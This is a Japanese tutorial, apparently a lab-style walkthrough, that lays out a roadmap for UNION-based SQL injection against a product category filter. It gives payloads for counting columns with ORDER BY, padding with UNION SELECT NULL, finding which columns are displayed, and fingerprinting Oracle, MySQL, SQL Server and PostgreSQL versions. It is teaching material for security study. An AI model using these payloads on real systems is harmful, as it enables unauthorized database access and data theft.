

---

# 🔥 UNION ベース SQL インジェクション完全ロードマップ  
（さっきの説明＋今回の手順を統合）

---

# 1. まず「元の SQL 文」を理解する

サーバー側には最初からこういう SQL がある：

```sql
SELECT name, price FROM products WHERE category = 'Tech gifts'
```

ユーザーが触れるのは **category の中身だけ**。

```
WHERE category = '[ここだけ変わる]'
```

SQLi はここに **自分の命令を埋め込む攻撃**。

---

# 2. 文字列を閉じて命令を差し込む

攻撃者が入れた入力：

```
'
```

これで元の `'Tech gifts'` が強制終了する。

```sql
WHERE category = ''
```

→ ここから先に **好きな SQL を追加できる状態**になる。

---

# 3. UNION を使って「別の結果」をくっつける

```
UNION SELECT ...
```

意味：

> **「元の結果に、俺が指定する結果を追加しろ」**

これが UNION 系 SQLi の本質。

---

# 4. 実戦手順（UNION 系 SQLi の王道）

## ① 表示列数を調べる（ORDER BY）
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

エラーが出た直前の数字  
→ **表示列数**

---

## ② UNION が通る形を作る（列数合わせ）
列数が 2 なら：

```sql
' UNION SELECT NULL, NULL--
```

列数が 3 なら：

```sql
' UNION SELECT NULL, NULL, NULL--
```

👉 **これが土台**

---

## ③ どの列が画面に表示されるか調べる
```sql
' UNION SELECT 'A', NULL--
' UNION SELECT NULL, 'B'--
```

画面に出た列  
→ **情報を抜ける列**

---

## ④ DB の種類を判定する（DB 方言チェック）

表示される列に DB 特有の値を入れて試す。

### Oracle
```sql
' UNION SELECT BANNER, NULL FROM v$version--
```

### MySQL / SQL Server
```sql
' UNION SELECT @@version, NULL--
```

### PostgreSQL
```sql
' UNION SELECT version(), NULL--
```

動いたやつ  
→ **その DB が使われている**

---

# 5. Oracle 版の分解（さっきの説明を統合）

攻撃 payload：

```
' UNION SELECT BANNER, NULL FROM v$version--
```

### `'`
文字列を閉じて命令を差し込む。

### `UNION SELECT`
元の結果に別の結果を追加。

### `BANNER`
Oracle のバージョン情報列。

### `NULL`
列数を合わせるためのダミー。

### `FROM v$version`
Oracle の自己紹介テーブル。

### `--`
残りをコメントアウトしてエラー防止。

---

# 6. サーバー内部で最終的に組み上がる SQL

```sql
WHERE category = ''
UNION SELECT BANNER, NULL FROM v$version--'
```

意味：

> **「カテゴリ条件を閉じて、Oracle のバージョン情報をくっつけて返せ。残りは無視しろ。」**

---

# 7. 超重要ポイント（理解の核）

- **列数調査 → 構造を把握**
- **表示列調査 → どこに情報を出せるか確認**
- **DB 判定 → 方言を確定**
- **いきなり DB 特有の SQL を打たない**

---

# 🎯 一文でまとめると

> **「まず形（列数）を合わせて、次に中身（DB依存SQL）を入れる」**

これが UNION 系 SQLi の “正しい崩し方”。

---


どれでも行ける。
